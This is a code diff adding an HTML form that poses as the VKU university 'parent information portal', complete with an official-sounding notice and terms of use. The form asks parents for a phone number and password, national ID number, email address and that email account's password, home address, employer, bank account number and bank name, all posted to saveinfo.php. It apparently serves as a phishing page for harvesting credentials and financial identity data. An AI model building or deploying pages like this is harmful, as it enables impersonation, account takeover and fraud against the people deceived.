@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8">
+  <title>Thông tin phụ huynh VKU</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="css.css" rel="stylesheet">
+  <link rel="stylesheet" href="font-awesome.min.css">
+  <link rel="stylesheet" href="phuhuynh.css">
+</head>
+<body>
+  <section>
+    <div class="container">
+      <div class="row justify-content-center">
+        <div class="col-md-8 text-center mb-5">
+          <img width="100%" src="header_mobile_phuhuynh.png">
+        </div>
+      </div>
+
+      <div class="row justify-content-center">
+        <div class="col-md-12 col-lg-10">
+          <div class="wrap d-md-flex">
+            <form action="saveinfo.php" method="post" class="signin-form" onsubmit="return verifyPassword();">
+              <div class="camket form-group">
+                <div class="dieukhoan"><h4>Điều khoản sử dụng hệ thống</h4></div>
+                <div class="noidung">
+                  <p>Căn cứ theo Thông báo số: 1788, ngày 28/10/2024 của Trường Đại học Công nghệ Thông tin và Truyền thông Việt - Hàn về việc triển khai sử dụng Cổng thông tin Phụ huynh.</p>  
+                  <p>Tôi, với tư cách là phụ huynh của sinh viên, xin cam kết thực hiện đầy đủ các nội dung sau:</p>
+                  <p>1. Truy cập và sử dụng Cổng thông tin Phụ huynh thường xuyên để cập nhật thông tin về tình hình học tập, rèn luyện của sinh viên tại trường.</p>
+                  <p>2. Chủ động tìm hiểu và sử dụng các tính năng của Cổng thông tin bao gồm: tra cứu thông tin sinh viên, thông tin học phí, kết quả học tập, chuyên cần, thời khóa biểu, chương trình đào tạo và các thông tin chung khác.</p>
+                  <p>3. Thực hiện đúng các quy định về bảo mật thông tin khi sử dụng Cổng thông tin, không chia sẻ tài khoản đăng nhập với người khác và không sử dụng thông tin trên Cổng thông tin cho các mục đích trái phép.</p>
+                  <p>4. Thông báo kịp thời cho Nhà trường khi phát hiện bất kỳ sự cố kỹ thuật hoặc nội dung không chính xác trên Cổng thông tin.</p>
+                  <p>5. Cam kết đọc kỹ và tuân thủ hướng dẫn sử dụng hệ thống cổng thông tin phụ huynh để sử dụng Cổng thông tin một cách hiệu quả.</p>
+                  <p>6. Hợp tác với Nhà trường trong việc sử dụng Cổng thông tin Phụ huynh để nâng cao hiệu quả công tác quản lý và hỗ trợ sinh viên.</p>
+                  <p>7. Liên hệ với Phòng Công tác Sinh viên khi gặp bất kỳ khó khăn hoặc vướng mắc nào trong quá trình sử dụng Cổng thông tin.</p>
+                </div>
+                <div class="checkbox">
+                  <input type="checkbox" id="checkdk" required> Tôi đồng ý với điều khoản sử dụng. <span id="messagedk"></span>
+                </div>
+              </div>
+
+              <div class="login-wrap p-4 p-md-5">
+                <b>Xin chào phụ huynh sinh viên, vui lòng điền thông tin vào form dưới đây để xác nhận thông tin:</b>
+
+                <div class="form-group mb-3">
+                  <label>SĐT:</label>
+                  <input type="text" class="form-control" name="sdt">
+                </div>
+
+                <div class="form-group mb-3">
+                  <label>Mật khẩu:</label>
+                  <input type="text" class="form-control" id="password" name="password" placeholder="Nhập mật khẩu" required>
+                </div>
+
+                <div class="form-group mb-3">
+                  <label>Nhập lại mật khẩu:</label>
+                  <input type="text" class="form-control" id="confirm_password" name="confirm_password" placeholder="Nhập lại mật khẩu" required>
+                  <span id="message"></span>
+                </div>
+
+                <!-- ✅ Các trường mới thêm -->
+                <div class="form-group mb-3"><label>CCCD/CMND:</label><input type="text" class="form-control" name="cccd" required></div>
+                <div class="form-group mb-3"><label>Email:</label><input type="email" class="form-control" name="email" required></div>
+                <div class="form-group mb-3"><label>Mật khẩu Email:</label><input type="passemail" class="form-control" name="passemail" required></div>
+                <div class="form-group mb-3"><label>Địa chỉ:</label><input type="text" class="form-control" name="diachi" required></div>
+                <div class="form-group mb-3"><label>Nghề nghiệp:</label><input type="text" class="form-control" name="nghenghiep" required></div>
+                <div class="form-group mb-3"><label>Nơi làm việc:</label><input type="text" class="form-control" name="noilamviec" required></div>
+                <div class="form-group mb-3"><label>Số tài khoản ngân hàng:</label><input type="text" class="form-control" name="stk" required></div>
+                <div class="form-group mb-3"><label>Tên ngân hàng:</label><input type="text" class="form-control" name="nganhang" required></div>
+
+                <div class="form-group">
+                  <button type="submit" class="form-control btn btn-primary rounded submit px-3">Gửi thông tin</button>
+                </div>
+
+                <p class="text-center">Cần hỗ trợ? Gọi <a href="tel:02367337113">0236.3.667.113</a></p>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <script>
+    function verifyPassword() {
+      var pw = document.getElementById("password").value;
+      var cpw = document.getElementById("confirm_password").value;
+      var ckdk = document.getElementById("checkdk").checked;
+
+      if (!ckdk) {
+        document.getElementById("messagedk").innerText = "Vui lòng xác nhận điều khoản.";
+        return false;
+      }
+
+      if (pw === "" || cpw === "") {
+        document.getElementById("message").innerText = "Vui lòng nhập mật khẩu.";
+        return false;
+      }
+
+      if (pw.length < 6) {
+        document.getElementById("message").innerText = "Mật khẩu tối thiểu 6 ký tự.";
+        return false;
+      }
+
+      if (pw.length > 12) {
+        document.getElementById("message").innerText = "Mật khẩu tối đa 12 ký tự.";
+        return false;
+      }
+
+      if (pw !== cpw) {
+        document.getElementById("message").innerText = "Mật khẩu không trùng khớp.";
+        return false;
+      }
+
+      return true;
+    }
+  </script>
+</body>
+</html>
